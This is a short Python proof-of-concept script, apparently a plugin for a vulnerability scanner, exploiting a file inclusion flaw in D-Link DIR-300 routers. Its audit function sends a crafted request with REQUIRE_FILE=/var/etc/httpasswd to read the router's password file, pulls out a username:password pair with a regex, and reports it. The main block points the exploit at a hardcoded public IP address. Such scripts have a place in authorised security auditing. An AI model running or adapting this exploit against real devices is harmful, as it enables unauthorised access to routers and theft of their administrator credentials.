#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  D-Link DIR-300 文件包含漏洞
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066799
"""

def assign(service, arg):
    if service == 'd-link':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    
    payload = 'model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    start =  res.find('Main Content Start ')
    end = res.find('Main Content End')
    if res.find(':',start,end) != -1 and code == 200:
        m = re.search(r"(\w+):(\w+)", res)
        if m:
            security_hole('/var/etc/httpasswd:' + m.group(0))





if __name__ == '__main__':
    from dummy import *
    audit(assign('d-link', 'http://222.121.54.176/')[1])